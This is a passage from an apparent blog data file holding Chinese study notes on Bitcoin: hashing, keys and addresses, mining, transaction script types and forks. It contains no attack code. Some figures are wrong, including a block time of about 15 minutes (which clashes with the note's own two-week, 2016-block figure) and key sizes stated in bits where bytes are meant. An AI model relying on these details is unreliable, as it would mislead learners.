获取256bit的随机值，即为32字节的随机值作为哈希值。\n### b.公钥生成\n\n- 根据私钥进行点乘法，获取目标点。\n- 非压缩格式开头为为0x04。\n- 加上x的32bit与y的32bit，为65位。\n- 压缩格式只存储x32bit的数值。\n- 前缀表示y的奇偶性质。\n- 0x02为偶，0x03为奇。\n\n### c.地址生成\n\n- 对于公钥进行第一次SHA-256。\n- 在进行一次RIPEMD-160哈希，获取20字节的数值。\n- 在加上前缀0x00表示在主网的地址。\n- 把前缀加20字节数值一起进行2次SHA-256,去前4个字节最为校验值。\n- 原地址 = 前缀 + 20字节的数值 + 校验值\n- 1+20+4 = 25字节\n- 目标地址为原地址进行base58编码。\n## 2.交易进行原理\n\n说明：比特币也是基于交易的状态机，在每个全节点都会有一个UTXO集合，即为未花费交易的输出。交易主要是通过对于指定账户进行转账，其中有锁定脚本，每次使用比特币消费，都必须进行脚本的验证，并且指定比特币的来源，脚本验证通过才可以进行花费，一般脚本都是要进行身份验证，以获取合法的权限进行交易。\n ![](./pic/Pasted%20image%2020240807151713.png)\n\n- 其中的类型即为交易脚本类型。\n- 脚本公钥为，下次交易的公钥，即为输出值地址的公钥,可通过公钥的哈希值，计算出账户。\n- 类型：即为脚本的类型。\n## 3.交易脚本验证的不同类型\n\n说明：交易验证是通过进行本次交易脚本的输入脚本作为前者，要花费的交易的输出脚本作为后者，然后对与脚本进行执行，执行通过，则说明交易合法，执行不通过则说明交易不合法，不予上链，其中脚本执行时用栈的形式进行执行的，其中脚本类型有几种 P2PK、P2PKH、P2SH。\n\n### a.P2PK(Pay to Public Key)\n\n- 输入脚本：PUSHDATA(Sig)\n- 输出脚本1：PUSHDATA(Public Key)\n- 输出脚本2：CHECKSIG\n\n执行：执行脚本时，先对本次交易的签名进行输入，然后获取输出脚本的公钥，对于本次交易进行验证，因为本次交易的发起者为拥有上次交易输出公钥的地址，对本次交易进行私钥签名，通过对于本次交易进行摘要，然后进行与公钥进行相关的EDSA计算，验证输入签名是否合法，合法则脚本执行通过。\n### b.P2PKH(Pay to Public Key Hash)\n\n- 输入脚本1：PUSHDATA(Sig)\n- 输入脚本2：PUSHDATA(Public Key)\n- 输出脚本1：DUP(复制操作)\n- 输出脚本2：HASH-160\n- 输出脚本3：PUSHDATA(Public Key Hash)\n- 输出脚本4：EQUALVERIFY\n- 输出脚本5：CHECKSIG\n执行：首先将Sig与Public Key先后入栈，复制Public key的值入栈，然后对于栈顶的Public Key进行HASH-160的计算，然后把输出脚本的Public Key Hash值入栈，然后出栈两个元素进行相等比较，一个是刚入栈的公钥哈希，一个是计算的公钥哈希，验证成功进行公钥与签名的验证。\n### c.P2SH(Pay to Script Hash)\n\n- 输入脚本：............\n- 输入脚本：PUSHDATA(Sig)\n- 输入脚本：PUSHDATA(Serialized redeemScript)\n- 输出脚本：HASH-160\n-  输出脚本：PUSHDATA(redeemScript HASH)\n- 输出脚本：EQUAL\n执行：先执行外步骤，判断脚本是否相同，再进行执行脚本内的操作执行，其中两步的验证操作是在同一个栈上进行的。\n\n### d.P2SH实现P2PK\n\n- 脚本的框架还是上述的P2PSH的，只是序列化赎回脚本内容写入了。\n- PUSHDATA(Public Key)\n- CHECKSIG\n\n执行：先进行基本的外循环执行，然后成功之后，栈中只留下了Sig，执行赎回脚本，放入Public Key,然后判断签名是否合法。\n\n### e.P2SH实现多重签名\n\n#### 普通的多重签名\n\n![](./pic/Pasted%20image%2020240722231809.png)\n\n- 其中的红色叉子是脚本的逻辑问题，最终会多弹出一个数值。\n\n#### P2SH实现多重签名\n\n- 输入脚本：Sig1\n- 输入脚本：Sig2\n- 输入脚本：Sig3\n- 输入脚本：序列化的赎回脚本。\n- 输出脚本：HASH-160\n- 输出脚本：脚本哈希。\n- 输出脚本：判断哈希是否相等。\n- 赎回脚本：M\n- 赎回脚本：Pubkey1\n- 赎回脚本：Pubkey2\n- 赎回脚本： PubKey3\n- 赎回脚本：N\n执行：按顺序执行，其中M为拥有M个合法的的公钥就行，N为所有签名的公钥数量总和。\n\n### f.Proof of Burn\n\n![](./pic/Pasted%20image%2020240722233216.png)\n\n- return之后的代码都不会进行存储。\n-  用来销毁比特币，这个币永远不能正确验证。\n- 销毁以获取小币种的加密货币，AltCoin。\n- 进行永久数据的存储。\n- coinbase也可以进行随意的写入，但是需要有区块的记账权。\n\n\n# 五.分叉\n\n## 1.原因\n\n- 同时获取合法区块。\n- 对于交易有分歧。\n- 恶意的节点进行分叉攻击，区块是合法的，用来不正当竞争。\n- 回滚交易，使得已经发布的交易无效。\n\n## 2.分叉类型\n\n### a.软分叉\n\n- 旧节点认新区块，新节点不认旧区块。\n- 旧认新，新不认旧。\n- 改变区块限制1M-->0.5M.\n### b.硬分叉\n\n- 旧节点不认的区块，新节点认。\n- 新认旧，旧不认新。\n- 改变区块大小限制由1M-->4M。","source":"_posts/BlockChain/ETH/00-BTC-入门总结.md","raw":"---\ntitle: 00-BTC入门\ndate: 2024-08-07 19:59:12\ntags:\n  - BlockChain\n  - BTC\ncategories:\n  - BlockChain\n  - BTC\n---\n# 一：比特币密码学与数据结构\n\n## 1.哈希函数\n\n### a. 常用哈希\n- sha256\n- RIPEMD-160\n### b.使用途径\n\n- 产生公钥。\n- 交易进行哈希。\n- 默克尔树生成。\n- 跟哈希的生成与验证。\n- 区块的哈希作为下一个区块的输入，验证区块是否合法。\n## 2.非对称加解密\n\n### a.使用的算法\n- ECDSA\n### b.使用的途径\n\n- 公钥生成。\n- 签名，用于脚本的验证，确保花费区块时的合法性。\n- 验证交易的来源是否合法，对于交易需要进行签名,其中公钥与签名都会放在区块中。\n## 3.哈希链表\n\n通过前一个区块的哈希进行作为本次区块计算哈希值的一个输入进行计算本次区块的哈希值。\n## 4.默克尔树\n\n通过对于交易进行两两哈希，生成默克尔树，最终生成一个跟哈希值，可以通过全节点提供的某个交易的根哈希路径上的交易哈希可以判断交易是否合法。\n\n# 二.区块与交易信息\n\n## 1.区块信息\n\n![](./pic/Pasted%20image%2020240807150054.png)\n\n- 855743：区块高度即为当前区块在公链中的第几个。\n- 时间：区块产生的时间。\n- 大小：区块的大小。\n- 交易费：所有交易的交易费用。\n- 确认数：本条链后有几个块。\n- 转账总金额：交易所有的转账金额的总和。\n- 挖矿难度。\n- 交易数：交易数量。\n- 上一个区块：上一个区块的哈希值，形成一个链式结构。\n- 默克尔树根哈希：交易的默克尔树的跟哈希。\n- coinbase：铸币用户，可以随意写，币是凭空产生的，在输出中写对就行。\n## 2.交易信息\n\n### a.铸币交易\n\n![](./pic/Pasted%20image%2020240807151207.png)\n\n\n- coinbase：可以随意写。\n- 输入地址为随意可修改的信息。\n- 输出地址为获得记账权的账户。\n- 输出的总金额为本区块的交易费与铸币奖励的总和。\n- 本次交易没有交易费用。\n### b.普通交易\n\n![](./pic/Pasted%20image%2020240807151713.png)\n\n- wintness：签名+公钥地址。\n- nSequence：交易的唯一标志，防止重放攻击。\n- 类型：交易脚本的类型。\n- ScriptPubKey：交易的公钥地址。\n# 三.区块共识实现与挖矿\n\n## 1.区块共识\n\n### a.实现方式\n\n通过算力实现对于区块的写入，算力越强，尝试的nonce次数越多，就越有可能获取到写入区块的能力，算是基于工作量证明的方式。\n\n## 2.挖矿\n\n介绍：即通过对于交易的组合与区块中某些可修改进行进行调整，从而获取满足目标值的哈希值，才能够获取记账权，从而进行区块上链。\n\n### a.基本原理\n\n- 通过对于交易的组合哈希与可修改的数据进行修改，生成一个去区块的哈希，以满足最终的目标值的满足条件。\n- 每次尝试的结果都是一样的，因为哈希计算没有什么相关性。\n- 算力强的节点，也只是进行的次数比较多才能够有更高的获得记账权的可能。\n\n### b.可调整的数值\n\n说明：根据上述2.1与2.2.a中的信息可以获取相关的详细信息。\n\n- 交易的重组生成的默克尔树的跟哈希不同。\n- 时间可以在秒级的范围进行微调，以为比特币的出块时间为15分钟大约。\n- nonce：随机值，是主要的调整的方式。\n- 铸币交易的输入信息：不会进行信息验证，可以在需要的情况下进行随机写入信息。\n- 铸币交易的输出信息：只要不转币，可以对于输出账户进行随意写入，或者写入需要的信息。\n\n### c.挖矿\n\n说明：通过调整可变的数值，获取区块的整体哈希值，不断对于可变数值进行随机调整，从而实现目标值的范围，从而获取合法的记账权，区块的哈希值小于等于目标值才是算符合条件的合法区块。\n\n### d.区块发布\n\n说明：对于所有的交易先进行脚本执行，确认交易的合法性\n## 3.难度调整\n\n- 每2016个区块进行一次难度调整，即2周左右调整一次。\n- 一般的出块时间都在15分钟左右。\n- 区块哈希 <= 目标值为合法\n- difficult = difficult * target_time/real_time\n- target = target * real_time/target_time \n\n\n# 四.账户与交易\n\n## 1.账户生成\n### a.私钥生成\n\n- 获取256bit的随机值，即为32字节的随机值作为哈希值。\n### b.公钥生成\n\n- 根据私钥进行点乘法，获取目标点。\n- 非压缩格式开头为为0x04。\n- 加上x的32bit与y的32bit，为65位。\n- 压缩格式只存储x32bit的数值。\n- 前缀表示y的奇偶性质。\n- 0x02为偶，0x03为奇。\n\n### c.地址生成\n\n- 对于公钥进行第一次SHA-256。\n- 在进行一次RIPEMD-160哈希，获取20字节的数值。\n- 在加上前缀0x00表示在主网的地址。\n- 把前缀加20字节数值一起进行2次SHA-256,去前4个字节最为校验值。\n- 原地址 = 前缀 + 20字节的数值 + 校验值\n- 1+20+4 = 25字节\n- 目标地址为原地址进行base58编码。\n## 2.交易进行原理\n\n说明：比特币也是基于交易的状态机，在每个全节点都会有一个UTXO集合，即为未花费交易的输出。交易主要是通过对于指定账户进行转账，其中有锁定脚本，每次使用比特币消费，都必须进行脚本的验证，并且指定比特币的来源，脚本验证通过才可以进行花费，一般脚本都是要进行身份验证，以获取合法的权限进行交易。\n ![](./pic/Pasted%20image%2020240807151713.png)\n\n- 其中的类型即为交易脚本类型。\n- 脚本公钥为，下次交易的公钥，即为输出值地址的公钥,可通过公钥的哈希值，计算出账户。\n- 类型：即为脚本的类型。\n## 3.交易脚本验证的不同类型\n\n说明：交易验证是通过进行本次交易脚本的输入脚本作为前者，要花费的交易的输出脚本作为后者，然后对与脚本进行执行，执行通过，则说明交易合法，执行不通过则说明交易不合法，不予上链，其中脚本执行时用栈的形式进行执行的，其中脚本类型有几种 P2PK、P2PKH、P2SH。\n\n### a.P2PK(Pay to Public Key)\n\n- 输入脚本：PUSHDATA(Sig)\n- 输出脚本1：PUSHDATA(Public Key)\n- 输出脚本2：CHECKSIG\n\n执行：执行脚本时，先对本次交易的签名进行输入，然后获取输出脚本的公钥，对于本次交易进行验证，因为本次交易的发起者为拥有上次交易输出公钥的地址，对本次交易进行私钥签名，通过对于本次交易进行摘要，然后进行与公钥进行相关的EDSA计算，验证输入签名是否合法，合法则脚本执行通过。\n### b.P2PKH(Pay to Public Key Hash)\n\n- 输入脚本1：PUSHDATA(Sig)\n- 输入脚本2：PUSHDATA(Public Key)\n- 输出脚本1：DUP(复制操作)\n- 输出脚本2：HASH-160\n- 输出脚本3：PUSHDATA(Public Key Hash)\n- 输出脚本4：EQUALVERIFY\n- 输出脚本5：CHECKSIG\n执行：首先将Sig与Public Key先后入栈，复制Public key的值入栈，然后对于栈顶的Public Key进行HASH-160的计算，然后把输出脚本的Public Key Hash值入栈，然后出栈两个元素进行相等比较，一个是刚入栈的公钥哈希，一个是计算的公钥哈希，验证成功进行公钥与签名的验证。\n### c.P2SH(Pay to Script Hash)\n\n- 输入脚本：............\n- 输入脚本：PUSHDATA(Sig)\n- 输入脚本：PUSHDATA(Serialized redeemScript)\n- 输出脚本：HASH-160\n-  输出脚本：PUSHDATA(redeemScript HASH)\n- 输出脚本：EQUAL\n执行：先执行外步骤，判断脚本是否相同，再进行执行脚本内的操作执行，其中两步的验证操作是在同一个栈上进行的。\n\n### d.P2SH实现P2PK\n\n- 脚本的框架还是上述的P2PSH的，只是序列化赎回脚本内容写入了。\n- PUSHDATA(Public Key)\n- CHECKSIG\n\n执行：先进行基本的外循环执行，然后成功之后，栈中只留下了Sig，执行赎回脚本，放入Public Key,然后判断签名是否合法。\n\n### e.P2SH实现多重签名\n\n#### 普通的多重签名\n\n![](./pic/Pasted%20image%2020240722231809.png)\n\n- 其中的红色叉子是脚本的逻辑问题，最终会多弹出一个数值。\n\n#### P2SH实现多重签名\n\n- 输入脚本：Sig1\n- 输入脚本：Sig2\n- 输入脚本：Sig3\n- 输入脚本：序列化的赎回脚本。\n- 输出脚本：HASH-160\n- 输出脚本：脚本哈希。\n- 输出脚本：判断哈希是否相等。\n- 赎回脚本：M\n- 赎回脚本：Pubkey1\n- 赎回脚本：Pubkey2\n- 赎回脚本： PubKey3\n- 赎回脚本：N\n执行：按顺序执行，其中M为拥有M个合法的的公钥就行，N为所有签名的公钥数量总和。\n\n### f.Proof of Burn\n\n![](./pic/Pasted%20image%2020240722233216.png)\n\n- return之后的代码都不会进行存储。\n-  用来销毁比特币，这个币永远不能正确验证。\n- 销毁以获取小币种的加密货币，AltCoin。\n- 进行永久数据的存储。\n- coinbase也可以进行随意的写入，但是需要有区块的记账权。\n\n\n# 五.分叉\n\n## 1.原因\n\n- 同时获取合法区块。\n- 对于交易有分歧。\n- 恶意的节点进行分叉攻击，区块是合法的，用来不正当竞争。\n- 回滚交易，使得已经发布的交易无效。\n\n## 2.分叉类型\n\n### a.软分叉\n\n- 旧节点认新区块，新节点不认旧区块。\n- 旧认新，新不认旧。\n- 改变区块限制1M-->0.5M.\n### b.硬分叉\n\n- 旧节点不认的区块，新节点认。\n- 新认旧，旧不认新。\n- 改变区块大小限制由1M-->4M。","slug":"BlockChain/ETH/00-BTC-入门总结","published":1,"updated":"2024-08-07T12:38:45.393Z","_id":"clzju0hn700006suna6v8a1qr","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"一：比特币密码学与数据结构\"><a href=\"#一：比特币密码学与数据结构\" class=\"headerlink\" title=\"一：比特币密码学与数据结构\"></a>一：比特币密码学与数据结构</h1><h2 id=\"1-哈希函数\"><a href=\"#1-哈希函数\" class=\"headerlink\" title=\"1.哈希函数\"></a>1.哈希函数</h2><h3 id=\"a-常用哈希\"><a href=\"#a-常用哈希\" class=\"headerlink\" title=\"a. 常用哈希\"></a>a. 常用哈希</h3><ul>\n<li>sha256</li>\n<li>RIPEMD-160</li>\n</ul>\n<h3 id=\"b-使用途径\"><a href=\"#b-使用途径\" class=\"headerlink\" title=\"b.使用途径\"></a>b.使用途径</h3><ul>\n<li>产生公钥。</li>\n<li>交易进行哈希。</li>\n<li>默克尔树生成。</li>\n<li>跟哈希的生成与验证。</li>\n<li>区块的哈希作为下一个区块的输入，验证区块是否合法。</li>\n</ul>\n<h2 id=\"2-非对称加解密\"><a href=\"#2-非对称加解密\" class=\"headerlink\" title=\"2.非对称加解密\"></a>2.非对称加解密</h2><h3 id=\"a-使用的算法\"><a href=\"#a-使用的算法\" class=\"headerlink\" title=\"a.使用的算法\"></a>a.使用的算法</h3><ul>\n<li>ECDSA</li>\n</ul>\n<h3 id=\"b-使用的途径\"><a href=\"#b-使用的途径\" class=\"headerlink\" title=\"b.使用的途径\"></a>b.使用的途径</h3><ul>\n<li>公钥生成。</li>\n<li>签名，用于脚本的验证，确保花费区块时的合法性。</li>\n<li>验证交易的来源是否合法，对于交易需要进行签名,其中公钥与签名都会放在区块中。</li>\n</ul>\n<h2 id=\"3-哈希链表\"><a href=\"#3-哈希链表\" class=\"headerlink\" title=\"3.哈希链表\"></a>3.哈希链表</h2><p>通过前一个区块的哈希进行作为本次区块计算哈希值的一个输入进行计算本次区块的哈希值。</p>\n<h2 id=\"4-默克尔树\"><a href=\"#4-默克尔树\" class=\"headerlink\" title=\"4.默克尔树\"></a>4.默克尔树</h2><p>通过对于交易进行两两哈希，生成默克尔树，最终生成一个跟哈希值，可以通过全节点提供的某个交易的根哈希路径上的交易哈希可以判断交易是否合法。</p>\n<h1 id=\"二-区块与交易信息\"><a href=\"#二-区块与交易信息\" class=\"headerlink\" title=\"二.区块与交易信息\"></a>二.区块与交易信息</h1><h2 id=\"1-区块信息\"><a href=\"#1-区块信息\" class=\"headerlink\" title=\"1.区块信息\"></a>1.区块信息</h2><p><img src=\"/./pic/Pasted%20image%2020240807150054.png\"></p>\n<ul>\n<li>855743：区块高度即为当前区块在公链中的第几个。</li>\n<li>时间：区块产生的时间。</li>\n<li>大小：区块的大小。</li>\n<li>交易费：所有交易的交易费用。</li>\n<li>确认数：本条链后有几个块。</li>\n<li>转账总金额：交易所有的转账金额的总和。</li>\n<li>挖矿难度。</li>\n<li>交易数：交易数量。</li>\n<li>上一个区块：上一个区块的哈希值，形成一个链式结构。</li>\n<li>默克尔树根哈希：交易的默克尔树的跟哈希。</li>\n<li>coinbase：铸币用户，可以随意写，币是凭空产生的，在输出中写对就行。</li>\n</ul>\n<h2 id=\"2-交易信息\"><a href=\"#2-交易信息\" class=\"headerlink\" title=\"2.交易信息\"></a>2.交易信息</h2><h3 id=\"a-铸币交易\"><a href=\"#a-铸币交易\" class=\"headerlink\" title=\"a.铸币交易\"></a>a.铸币交易</h3><p><img src=\"/./pic/Pasted%20image%2020240807151207.png\"></p>\n<ul>\n<li>coinbase：可以随意写。</li>\n<li>输入地址为随意可修改的信息。</li>\n<li>输出地址为获得记账权的账户。</li>\n<li>输出的总金额为本区块的交易费与铸币奖励的总和。</li>\n<li>本次交易没有交易费用。</li>\n</ul>\n<h3 id=\"b-普通交易\"><a href=\"#b-普通交易\" class=\"headerlink\" title=\"b.普通交易\"></a>b.普通交易</h3><p><img src=\"/./pic/Pasted%20image%2020240807151713.png\"></p>\n<ul>\n<li>wintness：签名+公钥地址。</li>\n<li>nSequence：交易的唯一标志，防止重放攻击。</li>\n<li>类型：交易脚本的类型。</li>\n<li>ScriptPubKey：交易的公钥地址。</li>\n</ul>\n<h1 id=\"三-区块共识实现与挖矿\"><a href=\"#三-区块共识实现与挖矿\" class=\"headerlink\" title=\"三.区块共识实现与挖矿\"></a>三.区块共识实现与挖矿</h1><h2 id=\"1-区块共识\"><a href=\"#1-区块共识\" class=\"headerlink\" title=\"1.区块共识\"></a>1.区块共识</h2><h3 id=\"a-实现方式\"><a href=\"#a-实现方式\" class=\"headerlink\" title=\"a.实现方式\"></a>a.实现方式</h3><p>通过算力实现对于区块的写入，算力越强，尝试的nonce次数越多，就越有可能获取到写入区块的能力，算是基于工作量证明的方式。</p>\n<h2 id=\"2-挖矿\"><a href=\"#2-挖矿\" class=\"headerlink\" title=\"2.挖矿\"></a>2.挖矿</h2><p>介绍：即通过对于交易的组合与区块中某些可修改进行进行调整，从而获取满足目标值的哈希值，才能够获取记账权，从而进行区块上链。</p>\n<h3 id=\"a-基本原理\"><a href=\"#a-基本原理\" class=\"headerlink\" title=\"a.基本原理\"></a>a.基本原理</h3><ul>\n<li>通过对于交易的组合哈希与可修改的数据进行修改，生成一个去区块的哈希，以满足最终的目标值的满足条件。</li>\n<li>每次尝试的结果都是一样的，因为哈希计算没有什么相关性。</li>\n<li>算力强的节点，也只是进行的次数比较多才能够有更高的获得记账权的可能。</li>\n</ul>\n<h3 id=\"b-可调整的数值\"><a href=\"#b-可调整的数值\" class=\"headerlink\" title=\"b.可调整的数值\"></a>b.可调整的数值</h3><p>说明：根据上述2.1与2.2.a中的信息可以获取相关的详细信息。</p>\n<ul>\n<li>交易的重组生成的默克尔树的跟哈希不同。</li>\n<li>时间可以在秒级的范围进行微调，以为比特币的出块时间为15分钟大约。</li>\n<li>nonce：随机值，是主要的调整的方式。</li>\n<li>铸币交易的输入信息：不会进行信息验证，可以在需要的情况下进行随机写入信息。</li>\n<li>铸币交易的输出信息：只要不转币，可以对于输出账户进行随意写入，或者写入需要的信息。</li>\n</ul>\n<h3 id=\"c-挖矿\"><a href=\"#c-挖矿\" class=\"headerlink\" title=\"c.挖矿\"></a>c.挖矿</h3><p>说明：通过调整可变的数值，获取区块的整体哈希值，不断对于可变数值进行随机调整，从而实现目标值的范围，从而获取合法的记账权，区块的哈希值小于等于目标值才是算符合条件的合法区块。</p>\n<h3 id=\"d-区块发布\"><a href=\"#d-区块发布\" class=\"headerlink\" title=\"d.区块发布\"></a>d.区块发布</h3><p>说明：对于所有的交易先进行脚本执行，确认交易的合法性</p>\n<h2 id=\"3-难度调整\"><a href=\"#3-难度调整\" class=\"headerlink\" title=\"3.难度调整\"></a>3.难度调整</h2><ul>\n<li>每2016个区块进行一次难度调整，即2周左右调整一次。</li>\n<li>一般的出块时间都在15分钟左右。</li>\n<li>区块哈希 &lt;&#x3D; 目标值为合法</li>\n<li>difficult &#x3D; difficult * target_time&#x2F;real_time</li>\n<li>target &#x3D; target * real_time&#x2F;target_time</li>\n</ul>\n<h1 id=\"四-账户与交易\"><a href=\"#四-账户与交易\" class=\"headerlink\" title=\"四.账户与交易\"></a>四.账户与交易</h1><h2 id=\"1-账户生成\"><a href=\"#1-账户生成\" class=\"headerlink\" title=\"1.账户生成\"></a>1.账户生成</h2><h3 id=\"a-私钥生成\"><a href=\"#a-私钥生成\" class=\"headerlink\" title=\"a.私钥生成\"></a>a.私钥生成</h3><ul>\n<li>获取256bit的随机值，即为32字节的随机值作为哈希值。</li>\n</ul>\n<h3 id=\"b-公钥生成\"><a href=\"#b-公钥生成\" class=\"headerlink\" title=\"b.公钥生成\"></a>b.公钥生成</h3><ul>\n<li>根据私钥进行点乘法，获取目标点。</li>\n<li>非压缩格式开头为为0x04。</li>\n<li>加上x的32bit与y的32bit，为65位。</li>\n<li>压缩格式只存储x32bit的数值。</li>\n<li>前缀表示y的奇偶性质。</li>\n<li>0x02为偶，0x03为奇。</li>\n</ul>\n<h3 id=\"c-地址生成\"><a href=\"#c-地址生成\" class=\"headerlink\" title=\"c.地址生成\"></a>c.地址生成</h3><ul>\n<li>对于公钥进行第一次SHA-256。</li>\n<li>在进行一次RIPEMD-160哈希，获取20字节的数值。</li>\n<li>在加上前缀0x00表示在主网的地址。</li>\n<li>把前缀加20字节数值一起进行2次SHA-256,去前4个字节最为校验值。</li>\n<li>原地址 &#x3D; 前缀 + 20字节的数值 + 校验值</li>\n<li>1+20+4 &#x3D; 25字节</li>\n<li>目标地址为原地址进行base58编码。</li>\n</ul>\n<h2 id=\"2-交易进行原理\"><a href=\"#2-交易进行原理\" class=\"headerlink\" title=\"2.交易进行原理\"></a>2.交易进行原理</h2><p>说明：比特币也是基于交易的状态机，在每个全节点都会有一个UTXO集合，即为未花费交易的输出。交易主要是通过对于指定账户进行转账，其中有锁定脚本，每次使用比特币消费，都必须进行脚本的验证，并且指定比特币的来源，脚本验证通过才可以进行花费，一般脚本都是要进行身份验证，以获取合法的权限进行交易。<br> <img src=\"/./pic/Pasted%20image%2020240807151713.png\"></p>\n<ul>\n<li>其中的类型即为交易脚本类型。</li>\n<li>脚本公钥为，下次交易的公钥，即为输出值地址的公钥,可通过公钥的哈希值，计算出账户。</li>\n<li>类型：即为脚本的类型。</li>\n</ul>\n<h2 id=\"3-交易脚本验证的不同类型\"><a href=\"#3-交易脚本验证的不同类型\" class=\"headerlink\" title=\"3.交易脚本验证的不同类型\"></a>3.交易脚本验证的不同类型</h2><p>说明：交易验证是通过进行本次交易脚本的输入脚本作为前者，要花费的交易的输出脚本作为后者，然后对与脚本进行执行，执行通过，则说明交易合法，执行不通过则说明交易不合法，不予上链，其中脚本执行时用栈的形式进行执行的，其中脚本类型有几种 P2PK、P2PKH、P2SH。</p>\n<h3 id=\"a-P2PK-Pay-to-Public-Key\"><a href=\"#a-P2PK-Pay-to-Public-Key\" class=\"headerlink\" title=\"a.P2PK(Pay to Public Key)\"></a>a.P2PK(Pay to Public Key)</h3><ul>\n<li>输入脚本：PUSHDATA(Sig)</li>\n<li>输出脚本1：PUSHDATA(Public Key)</li>\n<li>输出脚本2：CHECKSIG</li>\n</ul>\n<p>执行：执行脚本时，先对本次交易的签名进行输入，然后获取输出脚本的公钥，对于本次交易进行验证，因为本次交易的发起者为拥有上次交易输出公钥的地址，对本次交易进行私钥签名，通过对于本次交易进行摘要，然后进行与公钥进行相关的EDSA计算，验证输入签名是否合法，合法则脚本执行通过。</p>\n<h3 id=\"b-P2PKH-Pay-to-Public-Key-Hash\"><a href=\"#b-P2PKH-Pay-to-Public-Key-Hash\" class=\"headerlink\" title=\"b.P2PKH(Pay to Public Key Hash)\"></a>b.P2PKH(Pay to Public Key Hash)</h3><ul>\n<li>输入脚本1：PUSHDATA(Sig)</li>\n<li>输入脚本2：PUSHDATA(Public Key)</li>\n<li>输出脚本1：DUP(复制操作)</li>\n<li>输出脚本2：HASH-160</li>\n<li>输出脚本3：PUSHDATA(Public Key Hash)</li>\n<li>输出脚本4：EQUALVERIFY</li>\n<li>输出脚本5：CHECKSIG<br>执行：首先将Sig与Public Key先后入栈，复制Public key的值入栈，然后对于栈顶的Public Key进行HASH-160的计算，然后把输出脚本的Public Key Hash值入栈，然后出栈两个元素进行相等比较，一个是刚入栈的公钥哈希，一个是计算的公钥哈希，验证成功进行公钥与签名的验证。</li>\n</ul>\n<h3 id=\"c-P2SH-Pay-to-Script-Hash\"><a href=\"#c-P2SH-Pay-to-Script-Hash\" class=\"headerlink\" title=\"c.P2SH(Pay to Script Hash)\"></a>c.P2SH(Pay to Script Hash)</h3><ul>\n<li>输入脚本：…………</li>\n<li>输入脚本：PUSHDATA(Sig)</li>\n<li>输入脚本：PUSHDATA(Serialized redeemScript)</li>\n<li>输出脚本：HASH-160</li>\n<li>输出脚本：PUSHDATA(redeemScript HASH)</li>\n<li>输出脚本：EQUAL<br>执行：先执行外步骤，判断脚本是否相同，再进行执行脚本内的操作执行，其中两步的验证操作是在同一个栈上进行的。</li>\n</ul>\n<h3 id=\"d-P2SH实现P2PK\"><a href=\"#d-P2SH实现P2PK\" class=\"headerlink\" title=\"d.P2SH实现P2PK\"></a>d.P2SH实现P2PK</h3><ul>\n<li>脚本的框架还是上述的P2PSH的，只是序列化赎回脚本内容写入了。</li>\n<li>PUSHDATA(Public Key)</li>\n<li>CHECKSIG</li>\n</ul>\n<p>执行：先进行基本的外循环执行，然后成功之后，栈中只留下了Sig，执行赎回脚本，放入Public Key,然后判断签名是否合法。</p>\n<h3 id=\"e-P2SH实现多重签名\"><a href=\"#e-P2SH实现多重签名\" class=\"headerlink\" title=\"e.P2SH实现多重签名\"></a>e.P2SH实现多重签名</h3><h4 id=\"普通的多重签名\"><a href=\"#普通的多重签名\" class=\"headerlink\" title=\"普通的多重签名\"></a>普通的多重签名</h4><p><img src=\"/./pic/Pasted%20image%2020240722231809.png\"></p>\n<ul>\n<li>其中的红色叉子是脚本的逻辑问题，最终会多弹出一个数值。</li>\n</ul>\n<h4 id=\"P2SH实现多重签名\"><a href=\"#P2SH实现多重签名\" class=\"headerlink\" title=\"P2SH实现多重签名\"></a>P2SH实现多重签名</h4><ul>\n<li>输入脚本：Sig1</li>\n<li>输入脚本：Sig2</li>\n<li>输入脚本：Sig3</li>\n<li>输入脚本：序列化的赎回脚本。</li>\n<li>输出脚本：HASH-160</li>\n<li>输出脚本：脚本哈希。</li>\n<li>输出脚本：判断哈希是否相等。</li>\n<li>赎回脚本：M</li>\n<li>赎回脚本：Pubkey1</li>\n<li>赎回脚本：Pubkey2</li>\n<li>赎回脚本： PubKey3</li>\n<li>赎回脚本：N<br>执行：按顺序执行，其中M为拥有M个合法的的公钥就行，N为所有签名的公钥数量总和。</li>\n</ul>\n<h3 id=\"f-Proof-of-Burn\"><a href=\"#f-Proof-of-Burn\" class=\"headerlink\" title=\"f.Proof of Burn\"></a>f.Proof of Burn</h3><p><img src=\"/./pic/Pasted%20image%2020240722233216.png\"></p>\n<ul>\n<li>return之后的代码都不会进行存储。</li>\n<li>用来销毁比特币，这个币永远不能正确验证。</li>\n<li>销毁以获取小币种的加密货币，AltCoin。</li>\n<li>进行永久数据的存储。</li>\n<li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li>\n</ul>\n<h1 id=\"五-分叉\"><a href=\"#五-分叉\" class=\"headerlink\" title=\"五.分叉\"></a>五.分叉</h1><h2 id=\"1-原因\"><a href=\"#1-原因\" class=\"headerlink\" title=\"1.原因\"></a>1.原因</h2><ul>\n<li>同时获取合法区块。</li>\n<li>对于交易有分歧。</li>\n<li>恶意的节点进行分叉攻击，区块是合法的，用来不正当竞争。</li>\n<li>回滚交易，使得已经发布的交易无效。</li>\n</ul>\n<h2 id=\"2-分叉类型\"><a href=\"#2-分叉类型\" class=\"headerlink\" title=\"2.分叉类型\"></a>2.分叉类型</h2><h3 id=\"a-软分叉\"><a href=\"#a-软分叉\" class=\"headerlink\" title=\"a.软分叉\"></a>a.软分叉</h3><ul>\n<li>旧节点认新区块，新节点不认旧区块。</li>\n<li>旧认新，新不认旧。</li>\n<li>改变区块限制1M–&gt;0.5M.</li>\n</ul>\n<h3 id=\"b-硬分叉\"><a href=\"#b-硬分叉\" class=\"headerlink\" title=\"b.硬分叉\"></a>b.硬分叉</h3><ul>\n<li>旧节点不认的区块，新节点认。</li>\n<li>新认旧，旧不认新。</li>\n<li>改变区块大小限制由1M–&gt;4M。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"一：比特币密码学与数据结构\"><a href=\"#一：比特币密码学与数据结构\" class=\"headerlink\" title=\"一：比特币密码学与数据结构\"></a>一：比特币密码学与数据结构</h1><h2 id=\"1-哈希函数\"><a href=\"#1-哈希函数\" class=\"headerlink\" title=\"1.哈希函数\"></a>1.哈希函数</h2><h3 id=\"a-常用哈希\"><a href=\"#a-常用哈希\" class=\"headerlink\" title=\"a. 常用哈希\"></a>a. 常用哈希</h3><ul>\n<li>sha256</li>\n<li>RIPEMD-160</li>\n</ul>\n<h3 id=\"b-使用途径\"><a href=\"#b-使用途径\" class=\"headerlink\" 